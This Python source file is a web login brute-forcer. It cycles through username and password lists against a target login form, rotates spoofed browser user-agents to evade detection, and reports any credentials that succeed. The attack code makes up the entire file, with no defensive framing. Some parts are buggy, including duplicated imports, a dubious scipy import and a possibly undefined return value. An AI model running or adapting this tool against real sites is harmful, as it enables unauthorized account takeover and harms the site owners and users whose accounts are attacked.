import time
import requests
from scipy import rand


import time
import requests
from lxml import html
from scipy import rand
import mechanize
import ssl


def brute(parameters):
    '''
    tries all option for usernames and passwords on the login page
    '''
    content = {'url': parameters['url'],
               'method': parameters['method'],
               'user_param': parameters['user_param'],
               'password_param': parameters['password_param'],
               'action' : parameters['action'],
               }
    # if userlist is provided then checks if passwordlist is provided or just 1 password
    if parameters['user_list']:
        for user in parameters['user_list']:
            user = user.strip()
            user = user.split('\t')
            content['username'] = user[0]
            if parameters['password_list']:
                for password in parameters['password_list']:
                    password = password.strip()
                    password = password.split('\t')
                    content['password'] = password[0]
                    attack(content)
            else:
                content['password'] = parameters['password']
                attack(content)
    # if 1 username is provided then checks if passwordlist is provided or just 1 password
    elif parameters['password_list']:
        content['username'] = parameters['username']
        for password in parameters['password_list']:
            password = password.strip()
            password = password.split('\t')
            content['password'] = password[0]
            attack(content)

    else:
        content['username'] = parameters['username']
        content['password'] = parameters['password']
        attack(content)




def attack(content):
    '''

    '''

    if isinstance(content['username'],bytes):
        user =  content['username'].decode('utf-8')
    else:
        user = content['username']
    if isinstance(content['password'],bytes):
        pwd =  content['password'].decode('utf-8')
    else:
        pwd = content['password']


    url = content['url']

    # build packet headers in order to disguise as a browser
    headers = {'User-Agent': get_random_user_agent().encode().decode('utf-8'),
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
               'Accept-Language': 'en-gb,en;q=0.5',
               'Accept-Encoding': 'gzip,deflate',
               'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
               'Keep-Alive': '115',
               'Connection': 'keep-alive',
               'Cache-Control': 'max-age=0',
               'Referer': url}
    payload = {
        content['user_param']: content['username'],
        content['password_param']: content['password']
    }
    if content['method'] == 'post':
        resp = requests.post(url,data=payload, headers=headers)
    else:
        resp = requests.get(url,data=payload,headers=headers)

    print('[+][attack] trying' + ' username:' + user + ' password:' + pwd)

    if check_login(resp, content['password_param']):
        print('login successfull\n\nusername: ' + user + '\npassword: ' + pwd)
        exit(0)

def get_random_user_agent():
    '''generate random user agent to fill in the packet header'''
    import numpy as np
    random_ua = ''
    ua_file = 'utils/user_agent.txt'
    # delays = [5, 10, 15]
    # delay = np.random.choice(delays)
    # time.sleep(delay) # delay

    try:
        with open(ua_file) as f:
            lines = f.readlines()
        if len(lines) > 0:
            random = np.random.RandomState()
            index = random.permutation(len(lines) - 1)
            idx = np.asarray(index, dtype=np.integer)[0]
            random_proxy = lines[int(idx)]
            return random_proxy[0:len(random_proxy) - 2]  # need to fix this later
    except Exception as ex:
        print('Exception in user agent')
        print(str(ex))
    finally:
        return random_proxy[0:len(random_proxy) - 2]


def check_login(content, password_param):
    '''
    checks if login was successful by checking if status code is 200 and if the password field that
    is contained in the login form is no longer found in the page source
    '''
    read = content.text
    doc = html.document_fromstring(read)
    element = doc.xpath('//input[@type="password"]')

    for field in element:
        if field.get('name') == password_param:
            return False

    if content.status_code != 200:
        return False
    else:
        return True

